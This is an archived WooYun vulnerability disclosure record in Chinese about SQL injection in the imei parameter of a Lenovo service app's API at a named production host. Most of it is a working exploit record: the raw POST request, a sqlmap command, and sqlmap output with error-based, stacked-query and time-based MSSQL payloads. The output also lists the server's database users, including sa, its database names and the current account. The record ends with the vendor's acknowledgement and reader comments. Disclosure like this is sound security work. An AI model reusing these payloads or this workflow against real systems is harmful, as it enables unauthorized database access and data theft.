{"id": 38070, "wybug_id": "wooyun-2015-097887", "wybug_title": "联想某APP服务云端接口存在SQL注射漏洞", "wybug_corp": "联想", "wybug_author": "超威蓝猫", "wybug_date": "2015-02-21 13:30", "wybug_open_date": "2015-05-23 12:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-25：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-23：\t细节向公众公开  简要描述： 联想某APP服务云端接口存在SQL注射漏洞 详细说明：  从百度手机助手下载并安装\"乐服务\"。\n\n启动该应用，可以发现这条HTTP请求:\n\n\nPOST /Service2.asmx/GetHomePageData HTTP/1.1Content-Length: 129Content-Type: application/x-www-form-urlencodedHost: app.lenovocare.com.cnConnection: Keep-AliveUser-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)announceReadId=0&imei=000000000000000&model=Google&appVersionCode=2015021200&isCountByUmeng=1\n经验证，imei参数可注入。   漏洞证明：  \nsqlmap.py -r \"e:/1.txt\" --dbms=mssql --dbs --users --current-user\n\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: imei (POST)    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: announceReadId=0&imei=000000000000000' AND 4869=CONVERT(INT,(SELECT CHAR(113)+CHAR(112)+CHAR(118)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (4869=4869) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(122)+CHAR(106)+CHAR(113))) AND 'oeHG'='oeHG&model=Google&appVersionCode=2015021200&isCountByUmeng=1    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: announceReadId=0&imei=000000000000000'; WAITFOR DELAY '0:0:5'--&model=Google&appVersionCode=2015021200&isCountByUmeng=1    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: announceReadId=0&imei=000000000000000' WAITFOR DELAY '0:0:5'--&model=Google&appVersionCode=2015021200&isCountByUmeng=1---web server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008current user:    'db_spadmin'database management system users [10]:[*] ##MS_PolicyEventProcessingLogin##[*] ##MS_PolicyTsqlExecutionLogin##[*] db_moto[*] db_sell[*] db_spadmin[*] db_ts[*] imei_reader[*] sa[*] survey_reader[*] tse2e!@#usravailable databases [10]:[*] master[*] model[*] MotoService[*] msdb[*] ReportServer[*] ReportServerTempDB[*] ServiceSell[*] spadmin[*] tempdb[*] ts\n   修复方案：  新年给个8分至少嘛嘻嘻 ._ .    版权声明：转载请注明来源 超威蓝猫@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-02-22 12:00 厂商回复： 谢谢您对联想安全工作的支持,我们会尽快修复漏洞 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-04 12:41 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  哥们，这什么模拟器？    \n     2015-04-06 16:11 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  sdk 不卡吗？    \n     2015-05-23 12:36 |    \t\tRas Al Ghul \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:4        | 不可知论主义者)\t\t \n  app注入！涨姿势了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}